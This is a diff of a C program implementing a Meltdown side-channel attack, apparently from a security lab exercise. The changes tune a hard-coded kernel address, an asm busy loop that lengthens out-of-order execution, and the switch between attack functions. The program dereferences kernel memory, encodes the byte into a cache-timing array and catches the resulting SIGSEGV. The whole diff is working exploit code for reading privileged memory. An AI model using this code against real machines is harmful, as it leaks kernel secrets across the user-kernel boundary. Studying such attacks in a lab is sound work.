@@ -76,9 +76,8 @@ void attackChannel_x86(){
 
 // Out of order execution
 int meltdown(unsigned long kernel_addr){
-    //int key = 95;
-    //array[key*4096+DELTA] += 10;
-    //return 0;    
+    // int key = 95;
+    
     // Cache the data to improve success
     int fd = open("/proc/my_secret_key", O_RDONLY);
     if(fd<0){
@@ -88,18 +87,17 @@ int meltdown(unsigned long kernel_addr){
     int ret = pread(fd, NULL, 0, 0);    //Data is cached
 
 
-//    char data = *(char*) kernel_addr;   //Raises exception
-	int data = ((char*) kernel_addr)[0];
+    char data = *(char*) kernel_addr;   //Raises exception
     array[data*4096+DELTA] += 10;
 }
 
 //Improve the attack with arithmetic instruction
 void meltdown_busy_loop(unsigned long kernel_addr){
-    char kernel_data;
+    char kernel_data = 0;
 
     asm volatile(
-        ".rept 1000;"
-        "add $0x01, %%eax;"
+        ".rept 400;"
+        "add $0x141, %%eax;"
         ".endr;"
         
         :
@@ -110,25 +108,38 @@ void meltdown_busy_loop(unsigned long kernel_addr){
     kernel_data = *(char*)kernel_addr;
     array[kernel_data*4096 + DELTA] +=10;
 }
-void catch_segv(){	
+void catch_segv(){
     siglongjmp(jbuf, 1);
 }
 
 int main(){
-    unsigned long kernel_addr = 0x000000000dccd71b;
+	char* testStr = "abcd";
+    unsigned long kernel_addr = 0xfa4e3024	;
+
+    //prefetch data into L1 cache
+    // __builtin_prefetch((char*)kernel_addr);
+    // _mm_prefetch((char*)kernel_addr, 3);
+
+    int i;
+    for(i=1;i<10000;){
+    	i+=10;
+    }
+//	kernel_addr = testStr;
     signal(SIGSEGV, catch_segv);
 
+/*
     int fd = open("/proc/my_secret_key", O_RDONLY);
     if (fd < 0) {
         perror("open");
         return -1;
     }
+*/    
     flushChannel();
     
     if(sigsetjmp(jbuf, 1)==0)
     {
-        meltdown(kernel_addr);
-       // meltdown_busy_loop(kernel_addr);
+        // meltdown(kernel_addr);
+        meltdown_busy_loop(kernel_addr);
     }
     else{
         printf("Memory Access Violation\n");
